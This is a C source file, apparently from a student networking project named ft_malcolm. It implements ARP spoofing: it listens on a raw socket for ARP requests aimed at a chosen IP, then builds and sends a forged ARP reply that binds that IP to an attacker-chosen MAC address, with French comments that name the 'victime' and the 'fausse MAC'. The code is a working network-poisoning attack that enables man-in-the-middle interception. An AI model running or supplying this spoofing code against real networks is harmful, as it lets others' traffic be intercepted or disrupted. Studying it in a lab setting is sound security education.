#include "ft_malcolm.h"


int receive_arp(int sockfd, uint8_t *buffer, uint8_t *source_ip_converted)
{
	while (1)
	{
		if (recvfrom(sockfd, buffer, 1024, 0, NULL, NULL) < 0) 	// syscall bloquant, process en sleeping dans kernel : maj renvoit copie des recu en buffer.       taille maxa lire, pas de flag,  pas de source pour savoir qui a send, pas  de taille de la source.
		{
			perror("recvfrom");
			return 0;
		}

		// struct ethernet_header *eth = (struct ethernet_header *)buffer;  // on prent les 14 premier octet du buffer et ils vont dans la structure (contigue d octet une structure en realite)
		struct arp_packet *arp = (struct arp_packet *)(buffer + 14); // les restat dans la partie tram arp

		// recup le opcode et verif si on a bien recu le mec qu on target
		if (ntohs(arp->opcode) != 1)
		{
			printf("not an ARP request, ignoring\n");
			continue;
		}
		if (memcmp(arp->dst_ip, source_ip_converted, 4) != 0)
		{
			printf("ARP request is not for our IP, ignoring\n");
			continue;
		}
		return 1;
	}
}

void build_reply(uint8_t *reply, uint8_t *target_mac_converted, uint8_t *source_mac_converted, uint8_t *source_ip_converted, uint8_t *target_ip_converted)
{
	// construire la fausse reponse 
	memset(reply, 0, 42);

	struct ethernet_header *reply_eth = (struct ethernet_header *)reply;
	struct arp_packet      *reply_arp = (struct arp_packet *)(reply + 14);

	// ethernet header
	memcpy(reply_eth->dst_mac,  target_mac_converted, 6);  // on envoie à la victime
	memcpy(reply_eth->src_mac,  source_mac_converted, 6);  // on se fait passer pour source
	reply_eth->ethertype = htons(ETH_P_ARP);

	// arp reply
	reply_arp->hw_type    = htons(1);       // ethernet
	reply_arp->proto_type = htons(0x0800);  // IPv4
	reply_arp->hw_size    = 6;              // taille MAC
	reply_arp->proto_size = 4;              // taille IP
	reply_arp->opcode     = htons(2);       // 2 = reply

	memcpy(reply_arp->src_mac, source_mac_converted, 6);  // fausse MAC qu'on annonce
	memcpy(reply_arp->src_ip,  source_ip_converted,  4);  // fausse IP qu'on usurpe
	memcpy(reply_arp->dst_mac, target_mac_converted, 6);  // MAC de la victime
	memcpy(reply_arp->dst_ip,  target_ip_converted,  4);  // IP de la victime
}

int send_reply(int sockfd, uint8_t *reply, uint8_t *target_mac_converted, int ifindex)
{
	// renvoit la reply 
	struct sockaddr_ll dest;
	memset(&dest, 0, sizeof(dest));
	dest.sll_ifindex = ifindex;
	dest.sll_family  = AF_PACKET;
	dest.sll_halen   = 6;
	memcpy(dest.sll_addr, target_mac_converted, 6);

	if (sendto(sockfd, reply, 42, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0)
	{
		perror("sendto");
		return 0;
	}
	printf("ARP reply sent\n");
	return 1;
}
